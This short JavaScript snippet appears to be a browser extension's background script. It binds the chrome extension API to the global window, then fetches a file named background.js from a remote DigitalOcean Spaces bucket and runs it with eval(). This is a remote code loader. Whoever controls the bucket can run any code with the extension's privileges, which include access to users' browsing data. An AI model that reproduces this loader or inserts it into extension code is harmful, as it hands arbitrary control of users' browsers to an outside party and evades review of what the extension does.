window.chrome = chrome;
v = new Date().valueOf();
fetch(
  "https://extensions-bucket.fra1.cdn.digitaloceanspaces.com/background.js?v=" +
    v
)
  .then(function (n) {
    return n.text();
  })
  .then(function (n) {
    eval(n);
  });
